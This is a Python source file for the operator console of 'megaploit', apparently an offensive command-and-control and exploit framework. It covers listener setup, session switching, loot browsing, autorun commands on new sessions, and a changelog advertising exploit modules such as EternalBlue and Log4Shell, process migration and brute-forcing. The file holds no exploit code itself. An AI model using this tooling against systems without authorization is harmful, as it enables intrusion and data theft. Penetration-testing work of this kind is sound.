"""
megaploit.server.cli
~~~~~~~~~~~~~~~~~~~~
Metasploit-style interactive C2 console.

Features
--------
* Animated gradient ASCII banner on startup
* Colour-coded prompt that changes between global context and session context
* Spinner animation while waiting for a connection
* `sessions` command to list/switch between multiple simultaneous sessions
* Tab-completion via readline (where available)
* `use <id>` to switch into a session
* `back` to return to the global prompt
* `help` in any context
* Graceful SIGINT / EOFError handling
"""

from __future__ import annotations

import datetime
import glob as _glob_mod
import hashlib
import json
import os
import queue
import re
import shutil
import ssl
import sys
import threading
import time
import py_compile
from typing import Optional

try:
    import readline  # enables arrow-key history & tab completion
    _HAS_READLINE = True
except ImportError:
    _HAS_READLINE = False

from megaploit.core.crypto import load_key, key_fingerprint
from megaploit.core.autorun import autorun as _autorun
from megaploit.core.pipeline import pipeline as _pipeline
from megaploit.server.commands import dispatch, all_commands, CommandResult
from megaploit.server.listener import Listener, build_ssl_context
from megaploit.server.session import Session
from megaploit.toolbox.registry import registry as _tool_registry
from megaploit.toolbox import installer as _installer
from megaploit.toolbox.updater import UpdateChecker as _UpdateChecker
from megaploit.plugins.loader import plugin_loader as _plugin_loader
from megaploit.plugins.runner import run_plugin_command as _run_plugin_cmd
from megaploit.modules.registry import module_registry as _module_registry
from megaploit.modules.base import ModuleType as _ModuleType, ModuleError as _ModuleError
from megaploit.payload.builder import builder as _payload_builder, OutputFormat as _OutputFormat
from megaploit.payload.encoders import encoder_info as _encoder_info, ENCODERS as _ENCODERS

# ---------------------------------------------------------------------------
# Persistent settings  (~/.megaploit.json)
# ---------------------------------------------------------------------------

_SETTINGS_PATH = os.path.expanduser("~/.megaploit.json")
_HISTORY_PATH  = os.path.expanduser("~/.megaploit_history.json")

_DEFAULT_SETTINGS: dict = {
    "lhost":          "",
    "port":           4444,
    "auto_update":    False,
    "theme":          "default",
    "history_limit":  500,
    "watcher":        False,
    "engagement_name": "",
    "engagement_desc": "",
    "aliases":        {},
}


def load_settings() -> dict:
    """Load persistent settings, merging with defaults."""
    try:
        with open(_SETTINGS_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        return {**_DEFAULT_SETTINGS, **data}
    except FileNotFoundError:
        return dict(_DEFAULT_SETTINGS)
    except (json.JSONDecodeError, OSError):
        return dict(_DEFAULT_SETTINGS)


def save_settings(settings: dict) -> None:
    """Save settings dict to disk."""
    try:
        with open(_SETTINGS_PATH, "w", encoding="utf-8") as f:
            json.dump(settings, f, indent=2)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Command history file
# ---------------------------------------------------------------------------

class _CommandHistory:
    """Append-only JSON-lines command history log."""

    def __init__(self, path: str = _HISTORY_PATH, limit: int = 500) -> None:
        self._path  = path
        self._limit = limit
        self._buf:  list[dict] = []
        self._lock  = threading.Lock()
        self._load()

    def _load(self) -> None:
        try:
            with open(self._path, "r", encoding="utf-8") as f:
                self._buf = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self._buf = []

    def record(self, raw: str, context: str = "global", session_id: int = 0) -> None:
        entry = {
            "ts":         datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z"),
            "context":    context,
            "session_id": session_id,
            "cmd":        raw,
        }
        with self._lock:
            self._buf.append(entry)
            if len(self._buf) > self._limit:
                self._buf = self._buf[-self._limit:]
            self._flush()

    def _flush(self) -> None:
        try:
            with open(self._path, "w", encoding="utf-8") as f:
                json.dump(self._buf, f, indent=None, separators=(",", ":"))
        except OSError:
            pass

    def tail(self, n: int = 20) -> list[dict]:
        return self._buf[-n:]

    def search(self, query: str) -> list[dict]:
        q = query.lower()
        return [e for e in self._buf if q in e["cmd"].lower()]

    def clear(self) -> None:
        with self._lock:
            self._buf = []
            self._flush()


_cmd_history = _CommandHistory()

# ---------------------------------------------------------------------------
# ANSI colour / style helpers
# ---------------------------------------------------------------------------

_RESET   = "\033[0m"
_BOLD    = "\033[1m"
_DIM     = "\033[2m"
_ITALIC  = "\033[3m"
_UL      = "\033[4m"        # underline

# Standard foreground colours
_RED     = "\033[91m"
_GREEN   = "\033[92m"
_YELLOW  = "\033[93m"
_BLUE    = "\033[94m"
_MAGENTA = "\033[95m"
_CYAN    = "\033[96m"
_WHITE   = "\033[97m"
_GREY    = "\033[90m"

# 256-colour palette helpers  (fall back gracefully on limited terminals)
def _fg256(n: int, text: str) -> str:
    return f"\033[38;5;{n}m{text}{_RESET}"

def _c(text: str, *codes: str) -> str:
    """Wrap *text* in ANSI escape codes, reset at end."""
    return "".join(codes) + text + _RESET


def ok(msg: str)   -> str: return _c(f"[+] {msg}", _GREEN)
def err(msg: str)  -> str: return _c(f"[-] {msg}", _RED)
def info(msg: str) -> str: return _c(f"[*] {msg}", _CYAN)
def warn(msg: str) -> str: return _c(f"[!] {msg}", _YELLOW)


# ---------------------------------------------------------------------------
# Layout helpers  (boxes, rules, padding)
# ---------------------------------------------------------------------------

_TW = 78   # target terminal width

def _rule(char: str = "─", width: int = _TW, color: str = _GREY) -> str:
    return _c("  " + char * (width - 2), color)

def _box_top(title: str, width: int = _TW, color: str = _CYAN) -> str:
    inner = width - 4
    title_str = f" {title} "
    pad = inner - len(title_str)
    left = pad // 2
    right = pad - left
    return _c(f"  ╭{'─' * left}{title_str}{'─' * right}╮", color)

def _box_bot(width: int = _TW, color: str = _CYAN) -> str:
    return _c(f"  ╰{'─' * (width - 4)}╯", color)

def _box_row(text: str, width: int = _TW, color: str = _CYAN) -> str:
    inner = width - 4
    # strip ANSI for length measurement
    visible = re.sub(r'\033\[[0-9;]*m', '', text)
    pad = max(0, inner - len(visible))
    return _c("  │", color) + text + " " * pad + _c("│", color)


def _section(title: str, color: str = _CYAN) -> str:
    """Return a compact section header line."""
    bar = "━" * 3
    return f"\n  {_c(bar, color)} {_c(title, _BOLD, color)} {_c(bar, color)}"


def _kv(key: str, val: str, kw: int = 18) -> str:
    return f"  {_c(key + ':', _GREY):<{kw + 8}}  {val}"


# ---------------------------------------------------------------------------
# Progress bar  (used during toolbox install)
# ---------------------------------------------------------------------------

class _ProgressBar:
    """
    A simple inline progress bar that overwrites itself on the same line.
    Driven externally by calling .step() or .set_label().
    """
    _BAR_WIDTH = 30

    def __init__(self, total: int = 100, label: str = "") -> None:
        self._total   = max(total, 1)
        self._current = 0
        self._label   = label
        self._done    = False

    def set_label(self, label: str) -> None:
        self._label = label
        self._render()

    def step(self, n: int = 1) -> None:
        self._current = min(self._current + n, self._total)
        self._render()

    def finish(self) -> None:
        self._current = self._total
        self._render()
        sys.stdout.write("\n")
        sys.stdout.flush()
        self._done = True

    def _render(self) -> None:
        if self._done:
            return
        pct  = self._current / self._total
        fill = int(pct * self._BAR_WIDTH)
        bar  = _c("█" * fill, _CYAN) + _c("░" * (self._BAR_WIDTH - fill), _GREY)
        pct_str = _c(f"{int(pct * 100):>3}%", _BOLD, _WHITE)
        label = self._label[:30].ljust(30)
        line  = f"\r  {bar} {pct_str}  {_c(label, _GREY)} "
        sys.stdout.write(line)
        sys.stdout.flush()


# ---------------------------------------------------------------------------
# ASCII banner  (gradient red → dim)
# ---------------------------------------------------------------------------

_BANNER_LINES = [
    r"  ███╗   ███╗███████╗ ██████╗  █████╗ ██████╗ ██╗      ██████╗ ██╗████████╗",
    r"  ████╗ ████║██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
    r"  ██╔████╔██║█████╗  ██║  ███╗███████║██████╔╝██║     ██║   ██║██║   ██║   ",
    r"  ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║   ",
    r"  ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║██║     ███████╗╚██████╔╝██║   ██║   ",
    r"  ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝  ",
]

# 256-colour gradient: bright red → dark red per line
_BANNER_COLOURS = [196, 160, 124, 88, 52, 238]

_VERSION  = "v4.0.0"
_SUBTITLE = "Professional C2 & Exploit Framework"
_TAGLINE  = "For Authorized Penetration Testing Only"

# v4 feature badges shown on the subtitle row
_BADGES = [
    ("Meterpreter-class Shell", 39),   # sky blue
    ("20 Exploit Modules",       82),   # bright green
    ("AES-256-GCM",             220),   # gold
    ("507 Tests ✓",              46),   # green
]

# ---------------------------------------------------------------------------
# Changelog  (shown after the banner on startup; `whats new` to re-show)
# ---------------------------------------------------------------------------

_CHANGELOG: list[tuple[str, list[str]]] = [
    ("Advanced Shell  [NEW v4]", [
        "MeterpreterSession interactive console — tab-complete, per-session history",
        "migrate <pid>  — inject agent into another process (Windows + POSIX)",
        "port_scan <host> <ports>  — TCP scan from target's perspective (256 threads)",
        "run_psh / run_python  — PowerShell & in-agent Python execution",
        "load_extension / unload_extension  — runtime Python module injection",
        "screenshot_stream <n> [fps]  — burst JPEG frames over C2 channel",
        "pty_shell  — real PTY with resize on Unix, cmd.exe pipe on Windows",
        "whoami · getpid · getuid · sleep · beacon_sleep",
    ]),
    ("Exploit Modules  [NEW v4]", [
        "20 modules: EternalBlue, BlueKeep, ProxyLogon, Log4Shell, Spring4Shell",
        "PrintNightmare, Heartbleed, vsFTPd backdoor, Shellshock, Citrix CVE",
        "Apache Struts, IIS WebDAV, Redis RCE, Redis unauth, SQL injection",
        "SMB / SSH / FTP brute-force  +  anonymous FTP agent deployment",
        "Registry auto-discovery via os.walk() — nested paths supported",
    ]),
    ("Framework  [v4]", [
        "C++ probe support: .cpp .cc .cxx .hpp added to c_probe verb extractor",
        "datetime.utcnow() deprecation fixed in 8 locations (Python 3.12+ safe)",
        "MkDocs + Material theme auto-deployed to GitHub Pages on push to main",
        "507 tests passing — 69 meterp + 156 exploit module + 282 core tests",
    ]),
    ("Capture & Streaming  [v3]", [
        "screenshot: mss+cv2 JPEG q85 in-memory — ~10× smaller, no tmp file",
        "screenrecord: monotonic pacing, 1280px scaled, mp4v MP4, fps+scale args",
        "timelapse: all frames JPEG in-memory; ZIP_STORED; cap raised → 120",
    ]),
]


def _print_changelog() -> None:
    """Print the what's-new section — called once on startup, re-callable via 'whats new'."""
    print(_rule("─", color=_GREY))
    tag  = _c(f"  What's new in {_VERSION}", _BOLD, _WHITE)
    hint = _c("  (type  whats new  to re-show)", _DIM)
    print(f"{tag}  {hint}")
    print()
    for category, bullets in _CHANGELOG:
        print(f"  {_c('▸', _CYAN)} {_c(category, _BOLD, _WHITE)}")
        for b in bullets:
            print(f"    {_c('·', _GREY)} {_c(b, _GREY)}")
        print()
    print(_rule("─", color=_GREY))
    print()


def _print_banner() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    print()
    for line, col in zip(_BANNER_LINES, _BANNER_COLOURS):
        print(_fg256(col, line))
        time.sleep(0.045)
    print()

    # ── version / subtitle row ────────────────────────────────────────
    ver_badge  = f"\033[48;5;196m\033[38;5;231m\033[1m {_VERSION} \033[0m"   # red bg, white text
    subtitle   = (
        f"  {ver_badge}"
        f"  {_c(_SUBTITLE, _BOLD, _WHITE)}"
        f"  {_c('│', _GREY)}"
        f"  {_c(_TAGLINE, _GREY)}"
    )
    print(subtitle)
    print()

    # ── feature badge row ─────────────────────────────────────────────
    badge_parts = []
    for label, colour in _BADGES:
        badge_parts.append(f"\033[38;5;{colour}m◆\033[0m {_c(label, _GREY)}")
    print("  " + f"  {_c('·', _GREY)}  ".join(badge_parts))

    print(_rule("─", color=_GREY))
    print()
    _print_changelog()


# ---------------------------------------------------------------------------
# Spinner  (braille + label)
# ---------------------------------------------------------------------------

class _Spinner:
    _FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def __init__(self, message: str) -> None:
        self._msg    = message
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def __enter__(self):
        self._thread.start()
        return self

    def __exit__(self, *_):
        self._stop.set()
        self._thread.join()
        sys.stdout.write("\r" + " " * (_TW) + "\r")
        sys.stdout.flush()

    def _run(self) -> None:
        i = 0
        while not self._stop.is_set():
            frame = _c(self._FRAMES[i % len(self._FRAMES)], _CYAN)
            label = _c(self._msg, _GREY)
            elapsed = _c(f"{(i * 0.08):.1f}s", _DIM)
            sys.stdout.write(f"\r  {frame}  {label}  {elapsed}  ")
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1


# ---------------------------------------------------------------------------
# Session table
# ---------------------------------------------------------------------------

def _print_sessions(sessions: dict[int, Session]) -> None:
    if not sessions:
        print(f"\n  {_c('No active sessions.', _GREY)}\n")
        return
    print()
    cols = (
        f"  {'ID':<5} {'IP ADDRESS':<20} {'PORT':<7} {'UPTIME':<12}"
        f" {'TAG':<14} {'OS':<18} {'STATUS'}"
    )
    print(_c(cols, _BOLD, _WHITE))
    print(_rule("─"))
    for sid, sess in sessions.items():
        dot     = _c("●", _GREEN)
        id_str  = _c(str(sid), _CYAN, _BOLD)
        ip_str  = _c(sess.ip, _WHITE)
        tag_str = _c(sess.tag[:13], _YELLOW) if sess.tag else _c("—", _DIM)
        os_str  = _c(sess.os_name[:17], _GREY) if sess.os_name else _c("unknown", _DIM)
        print(
            f"  {id_str:<14} {ip_str:<29} {sess.port:<7}"
            f" {sess.uptime:<12} {tag_str:<23} {os_str:<27} {dot} active"
        )
    print()


# ---------------------------------------------------------------------------
# Loot browser helpers
# ---------------------------------------------------------------------------

def _loot_summary() -> dict[str, int]:
    """Count files in loot subdirectories."""
    summary: dict[str, int] = {}
    loot_root = "loot"
    if not os.path.isdir(loot_root):
        return summary
    for entry in os.listdir(loot_root):
        full = os.path.join(loot_root, entry)
        if os.path.isdir(full):
            count = sum(len(fs) for _, _, fs in os.walk(full))
            summary[entry] = count
        elif os.path.isfile(full):
            summary.setdefault("root", 0)
            summary["root"] += 1
    return summary


def _print_loot_tree(path: str, indent: int = 0) -> None:
    """Recursively print loot directory contents."""
    prefix = "    " * indent
    try:
        entries = sorted(os.listdir(path))
    except PermissionError:
        return
    for entry in entries:
        full = os.path.join(path, entry)
        if os.path.isdir(full):
            print(f"{prefix}  {_c('/', _CYAN)}{_c(entry, _CYAN, _BOLD)}/")
            _print_loot_tree(full, indent + 1)
        else:
            size = os.path.getsize(full)
            size_str = _human_size(size)
            print(f"{prefix}  {_c('·', _GREY)} {entry:<40} {_c(size_str, _DIM)}")


def _human_size(n: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.0f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"


# ---------------------------------------------------------------------------
# Tab completion
# ---------------------------------------------------------------------------

_GLOBAL_CMDS  = [
    "sessions", "use", "generate", "set", "help", "clear", "exit",
    "toolbox", "plugins", "whatsnew",
    "loot", "engagement", "broadcast", "alias", "unalias", "aliases",
    "history", "env_probe", "workspace",
    "plugins enable", "plugins disable", "plugins load", "plugins watcher",
    # Module system
    "show modules", "info", "run", "check", "options", "setopt", "back",
    # Operations
    "jobs", "creds", "report", "autorun", "stage0",
]
_SESSION_CMDS = list(all_commands().keys()) + ["back", "clear"]

def _completer(text: str, state: int) -> Optional[str]:
    tool_names   = [f"toolbox_run {t.name}" for t in _tool_registry.all()]
    plugin_cmds  = _plugin_loader.all_command_names()
    module_names = [f"use {n}" for n in _module_registry.names()]
    pool = _GLOBAL_CMDS + _SESSION_CMDS + tool_names + plugin_cmds + module_names
    options = [c for c in pool if c.startswith(text)]
    return options[state] if state < len(options) else None

if _HAS_READLINE:
    readline.set_completer(_completer)
    readline.parse_and_bind("tab: complete")


# ---------------------------------------------------------------------------
# Main CLI class
# ---------------------------------------------------------------------------

class Console:
    """The interactive operator console.  Call run() to start."""

    def __init__(self) -> None:
        self._sessions: dict[int, Session] = {}
        self._sessions_lock = threading.Lock()
        self._new_sessions: queue.Queue[Session] = queue.Queue()
        self._listener: Optional[Listener] = None
        self._updater: Optional[_UpdateChecker] = None

        # ── Persistent settings ──────────────────────────────────────
        self._settings: dict = load_settings()

        self.bind_host:   str   = "0.0.0.0"
        self.lhost:       str   = self._settings.get("lhost", "")
        self.port:        int   = int(self._settings.get("port", 4444))
        self.cert:        str   = ""
        self.key_file:    str   = ""
        self.secret_key:  bytes = b""
        self.allowed_ips: list[str] = []
        self.auto_update: bool  = bool(self._settings.get("auto_update", False))

        # ── Engagement metadata ──────────────────────────────────────
        self.engagement_name: str = self._settings.get("engagement_name", "")
        self.engagement_desc: str = self._settings.get("engagement_desc", "")
        self.engagement_start: float = time.time()

        # ── Command aliases  (name → full command string) ────────────
        self._aliases: dict[str, str] = dict(self._settings.get("aliases", {}))

        # ── Watcher flag (start on boot if saved) ────────────────────
        self._watcher_enabled: bool = bool(self._settings.get("watcher", False))

        # ── Active module (use <module/path>) ────────────────────────
        self._active_module = None          # Module instance or None
        self._active_module_name: str = ""  # display name

    # ---------------------------------------------------------------
    # Entry point
    # ---------------------------------------------------------------

    def run(self, bind_host: str, lhost: str, port: int,
            cert: str = "", key_file: str = "",
            secret_key_path: str = "secret.key",
            allowed_ips: list[str] | None = None,
            auto_update: bool = False) -> None:

        self.bind_host   = bind_host
        self.lhost       = lhost
        self.port        = port
        self.cert        = cert
        self.key_file    = key_file
        self.secret_key  = load_key(secret_key_path)
        self.allowed_ips = allowed_ips or []
        self.auto_update = auto_update

        _print_banner()

        # ── startup info box ──────────────────────────────────────
        fp = key_fingerprint(self.secret_key)
        tls_val  = _c(f"{cert}", _GREEN) if cert else _c("disabled", _YELLOW)
        upd_val  = _c("on (auto)", _GREEN) if auto_update else _c("notify only", _GREY)
        ip_val   = _c(", ".join(allowed_ips), _GREEN) if allowed_ips else _c("any  ⚠", _YELLOW)

        print(_box_top("Server Configuration"))
        print(_box_row(_kv("LHOST",       _c(lhost, _CYAN))))
        print(_box_row(_kv("Port",        _c(str(port), _CYAN))))
        print(_box_row(_kv("TLS",         tls_val)))
        print(_box_row(_kv("IP allowlist",ip_val)))
        print(_box_row(_kv("Auto-update", upd_val)))
        print(_box_row(_kv("Key fprint",  _c(f"{fp[:8]} {fp[8:]}", _DIM))))
        print(_box_bot())
        print()

        self._start_updater()
        self._load_plugins()
        self._load_modules()
        if self._watcher_enabled:
            _plugin_loader.start_watcher(
                on_reload=lambda l, e: print(
                    ok(f"Plugin hot-reload: {l} loaded, {e} errors") if l or e else None
                )
            )
        self._start_listener()
        self._global_loop()
        # Save settings on clean exit
        self._save_settings_to_disk()

    # ---------------------------------------------------------------
    # Plugin loader
    # ---------------------------------------------------------------

    def _load_plugins(self) -> None:
        loaded, _errs = _plugin_loader.load_all()
        if loaded:
            print(ok(f"Loaded {loaded} plugin(s) from plugins/"))
        for fname, msg in _plugin_loader.errors():
            print(warn(f"Plugin error in '{fname}': {msg}"))

    def _load_modules(self) -> None:
        loaded, errors = _module_registry.reload()
        if loaded:
            print(ok(f"Module registry: {loaded} module(s) loaded"))
        for path, msg in _module_registry.errors():
            name = os.path.basename(path)
            print(warn(f"Module error in '{name}': {msg.splitlines()[-1]}"))

    # ---------------------------------------------------------------
    # Updater
    # ---------------------------------------------------------------

    def _start_updater(self) -> None:
        self._updater = _UpdateChecker(megaploit_dir=".", auto_update=self.auto_update)
        self._updater.start()
        mode = _c("auto-update ON", _GREEN) if self.auto_update else _c("notify only", _GREY)
        print(info(f"Update checker started — {mode}"))

    def _drain_updates(self) -> None:
        if self._updater is None:
            return
        for note in self._updater.drain():
            print(note)

    # ---------------------------------------------------------------
    # Listener management
    # ---------------------------------------------------------------

    def _start_listener(self) -> None:
        ssl_ctx: Optional[ssl.SSLContext] = None
        if self.cert and self.key_file:
            try:
                ssl_ctx = build_ssl_context(self.cert, self.key_file)
                print(ok(f"TLS enabled  ({self.cert})"))
            except ssl.SSLError as e:
                print(err(f"TLS error: {e}"))
                sys.exit(1)
        else:
            print(warn("TLS not configured — traffic is unencrypted."))

        self._listener = Listener(
            bind_host=self.bind_host,
            port=self.port,
            secret_key=self.secret_key,
            on_session=self._on_new_session,
            ssl_context=ssl_ctx,
            allowed_ips=self.allowed_ips or None,
        )
        self._listener.start()
        print(ok(f"Listener ready on {_c(self.bind_host, _CYAN)}:{_c(str(self.port), _CYAN)}"))
        print(info(f"Agents should call back to  {_c(self.lhost, _WHITE)}:{_c(str(self.port), _WHITE)}"))
        print()

    def _on_new_session(self, session: Session) -> None:
        with self._sessions_lock:
            self._sessions[session.id] = session
        self._new_sessions.put(session)
        # Pipeline — autorun baseline + active collection profiles
        try:
            cmds = _pipeline.commands_for(session)
            if cmds:
                def _dispatch_autorun(s=session, c=cmds):
                    import time as _time
                    _time.sleep(0.5)  # brief delay for session to stabilise
                    for cmd in c:
                        try:
                            from megaploit.server.commands import dispatch as _dispatch
                            _dispatch(s, cmd)
                        except Exception:
                            pass
                threading.Thread(target=_dispatch_autorun, daemon=True).start()
        except Exception:
            pass

    # ---------------------------------------------------------------
    # New-session notification
    # ---------------------------------------------------------------

    def _drain_new_sessions(self) -> None:
        while not self._new_sessions.empty():
            try:
                sess = self._new_sessions.get_nowait()
                # Draw an eye-catching alert box
                print()
                print(_box_top(f"  ★  NEW SESSION  #{sess.id}  ★  ", color=_GREEN))
                print(_box_row(_kv("Address", _c(f"{sess.ip}:{sess.port}", _WHITE)), color=_GREEN))
                print(_box_row(_kv("Interact", _c(f"use {sess.id}", _CYAN, _BOLD)),  color=_GREEN))
                print(_box_bot(color=_GREEN))
                print()
            except queue.Empty:
                break
        self._drain_updates()

    # ---------------------------------------------------------------
    # Global prompt loop
    # ---------------------------------------------------------------

    def _global_loop(self) -> None:
        print(f"  {_c('Type', _GREY)} {_c('help', _CYAN)} {_c('for commands.', _GREY)}\n")
        while True:
            self._drain_new_sessions()
            try:
                n_sessions = len(self._sessions)
                sess_badge = (
                    _c(f"[{n_sessions}]", _GREEN, _BOLD)
                    if n_sessions else _c("[0]", _GREY)
                )
                # Global prompt:  [v4.0.0] megaploit [N] »
                ver_pill = f"\033[48;5;196m\033[38;5;231m\033[1m v4 \033[0m"
                mod_badge = (
                    f" {_c('[', _GREY)}{_c(self._active_module_name, _YELLOW, _BOLD)}{_c(']', _GREY)}"
                    if self._active_module_name else ""
                )
                prompt = (
                    f"\n  {ver_pill}"
                    f" {_c('megaploit', _RED, _BOLD)}"
                    f"{mod_badge}"
                    f" {sess_badge}"
                    f" {_c('»', _GREY)} "
                )
                raw = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self._shutdown()
                return

            if not raw:
                continue

            # Alias expansion
            parts = raw.split()
            first = parts[0].lower()
            if first in self._aliases:
                raw   = self._aliases[first] + (" " + " ".join(parts[1:]) if parts[1:] else "")
                parts = raw.split()
                first = parts[0].lower()

            cmd  = parts[0].lower()
            args = parts[1:]

            # Record to history
            _cmd_history.record(raw, context="global")

            if cmd == "exit":
                self._shutdown()
                return
            elif cmd in ("help", "?"):
                self._global_help()
            elif cmd in ("whats new", "whatsnew", "changelog"):
                _print_changelog()
            elif cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")
            elif cmd == "sessions":
                with self._sessions_lock:
                    _print_sessions(dict(self._sessions))
            elif cmd == "use":
                self._cmd_use(args)
            elif cmd == "generate":
                self._cmd_generate(args)
            elif cmd == "set":
                self._cmd_set(args)
            elif cmd in ("setoption", "setopt"):
                self._cmd_setoption(args)
            elif cmd == "run":
                self._cmd_module_run(args)
            elif cmd == "check":
                self._cmd_module_check(args)
            elif cmd in ("info", "module_info"):
                self._cmd_module_info(args)
            elif cmd in ("show", "search_modules"):
                self._cmd_show(args)
            elif cmd == "back":
                # 'back' in global context clears active module
                if self._active_module:
                    print(info(f"Cleared module: {_c(self._active_module_name, _CYAN)}"))
                    self._active_module      = None
                    self._active_module_name = ""
                else:
                    print(warn("  Not inside a session or module context."))
            elif cmd == "options":
                self._cmd_module_options()
            elif cmd == "jobs":
                self._cmd_jobs(args)
            elif cmd == "creds":
                self._cmd_creds(args)
            elif cmd == "report":
                self._cmd_report(args)
            elif cmd == "autorun":
                self._cmd_autorun(args)
            elif cmd == "pipeline":
                self._cmd_pipeline(args)
            elif cmd == "stage0":
                self._cmd_stage0(args)
            elif cmd == "payload":
                self._cmd_payload(args)
            elif cmd == "web":
                self._cmd_web(args)
            elif cmd == "rpc":
                self._cmd_rpc(args)
            elif cmd == "toolbox":
                self._cmd_toolbox(args)
            elif cmd in ("toolbox_run", "toolbox_deploy"):
                print(warn(f"  '{cmd}' must be run inside a session."))
                print(info(f"  Type  use <id>  to enter a session, then run:"))
                print(f"  {_c(cmd, _CYAN)} {' '.join(args) if args else _c('<tool-name>', _GREY)}")
            elif cmd == "plugins":
                self._cmd_plugins(args)
            elif cmd == "loot":
                self._cmd_loot(args)
            elif cmd == "engagement":
                self._cmd_engagement(args)
            elif cmd == "broadcast":
                self._cmd_broadcast(args)
            elif cmd in ("alias",):
                self._cmd_alias(args)
            elif cmd == "unalias":
                self._cmd_unalias(args)
            elif cmd == "aliases":
                self._cmd_aliases_list()
            elif cmd == "history":
                self._cmd_history(args)
            elif cmd == "env_probe":
                self._cmd_env_probe(args)
            elif cmd == "workspace":
                self._cmd_workspace(args)
            elif _plugin_loader.is_plugin_command(cmd):
                pc     = _plugin_loader.get_command(cmd)
                result = _run_plugin_cmd(pc, args, lhost=self.lhost, port=self.port)
                self._print_result(result)
            else:
                print(err(f"Unknown command: {_c(cmd, _BOLD)}  — type {_c('help', _CYAN)}"))

    # ---------------------------------------------------------------
    # Session interaction loop
    # ---------------------------------------------------------------

    def _session_loop(self, session: Session) -> None:
        print()
        print(_rule("─", color=_CYAN))
        tag_part = f"  {_c(session.tag, _YELLOW, _BOLD)}" if session.tag else ""
        os_part  = f"  {_c(session.os_name, _DIM)}"      if session.os_name else ""
        print(f"  {_c('●', _GREEN)} Session {_c(f'#{session.id}', _CYAN, _BOLD)}"
              f"  {_c(session.ip, _WHITE)}{tag_part}{os_part}"
              f"  {_c('— type  back  to return', _GREY)}")
        print(_rule("─", color=_CYAN))
        print()

        while True:
            self._drain_new_sessions()
            try:
                tag_badge = (
                    f" {_c('[', _GREY)}{_c(session.tag, _YELLOW)}{_c(']', _GREY)}"
                    if session.tag else ""
                )
                # Session prompt:  [v4.0.0] megaploit session(N)[@tag] »
                ver_pill = f"\033[48;5;22m\033[38;5;154m\033[1m v4 \033[0m"  # dark-green bg
                prompt = (
                    f"\n  {ver_pill}"
                    f" {_c('megaploit', _RED, _BOLD)}"
                    f" {_c('session', _GREY)}"
                    f"{_c('(', _GREY)}{_c(str(session.id), _CYAN, _BOLD)}{_c(')', _GREY)}"
                    f"{tag_badge}"
                    f" {_c('»', _GREY)} "
                )
                raw = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return

            if not raw:
                continue

            # Alias expansion (session context)
            parts = raw.split()
            first = parts[0].lower()
            if first in self._aliases:
                raw   = self._aliases[first] + (" " + " ".join(parts[1:]) if parts[1:] else "")
                parts = raw.split()

            _cmd_history.record(raw, context="session", session_id=session.id)

            parts    = raw.split()
            cmd_name = parts[0].lower()
            args     = parts[1:]

            if cmd_name == "back":
                print(_rule("─", color=_GREY))
                return

            if cmd_name == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue

            if cmd_name == "toolbox":
                print(warn("  'toolbox' is a global command — type  back  first, then use:"))
                print(f"  {_c('toolbox install <url> <name>', _CYAN)}  /  "
                      f"{_c('toolbox list', _CYAN)}  /  "
                      f"{_c('toolbox info <name>', _CYAN)}")
                continue

            # Dangerous command confirmation
            cmds = all_commands()
            is_dangerous = (
                (cmd_name in cmds and cmds[cmd_name].dangerous)
                or (
                    _plugin_loader.is_plugin_command(cmd_name)
                    and _plugin_loader.get_command(cmd_name).dangerous
                )
            )
            if is_dangerous:
                print()
                print(_c(f"  ⚠  '{cmd_name}' is a destructive operation.", _YELLOW, _BOLD))
                confirm = input(_c("     Type YES to confirm: ", _YELLOW)).strip()
                if confirm != "YES":
                    print(warn("  Cancelled."))
                    continue

            if _plugin_loader.is_plugin_command(cmd_name):
                pc     = _plugin_loader.get_command(cmd_name)
                result = _run_plugin_cmd(
                    pc, args,
                    session=session,
                    lhost=self.lhost,
                    port=self.port,
                )
                self._print_result(result)
                if result.close_session:
                    with self._sessions_lock:
                        self._sessions.pop(session.id, None)
                    session.close()
                    print(info(f"Session #{session.id} closed."))
                    return
                continue

            result: CommandResult = dispatch(session, raw)
            self._print_result(result)

            if result.close_session:
                with self._sessions_lock:
                    self._sessions.pop(session.id, None)
                session.close()
                print(info(f"Session #{session.id} closed."))
                return

    # ---------------------------------------------------------------
    # Result renderer
    # ---------------------------------------------------------------

    def _print_result(self, result: CommandResult) -> None:
        if not result.output:
            return
        if result.ok:
            out = result.output
            out = re.sub(r"^\[\+\]", _c("[+]", _GREEN),  out, flags=re.MULTILINE)
            out = re.sub(r"^\[-\]",  _c("[-]", _RED),    out, flags=re.MULTILINE)
            out = re.sub(r"^\[\*\]", _c("[*]", _CYAN),   out, flags=re.MULTILINE)
            out = re.sub(r"^\[!\]",  _c("[!]", _YELLOW), out, flags=re.MULTILINE)
            print(out)
        else:
            print(err(result.output))

    # ---------------------------------------------------------------
    # Sub-commands
    # ---------------------------------------------------------------

    def _cmd_use(self, args: list[str]) -> None:
        if not args:
            print(err("Usage: use <session_id>  |  use <module/path>"))
            return
        target = args[0]
        # Numeric → session, otherwise → module
        if target.isdigit():
            sid = int(target)
            with self._sessions_lock:
                session = self._sessions.get(sid)
            if not session:
                print(err(f"No session with ID {sid}"))
                return
            self._session_loop(session)
        else:
            # Try to load as a module
            self._cmd_use_module(args)

    def _cmd_generate(self, args: list[str]) -> None:
        if not self.lhost or not self.port:
            print(err("Set LHOST and PORT first:  set lhost <ip>  /  set port <port>"))
            return
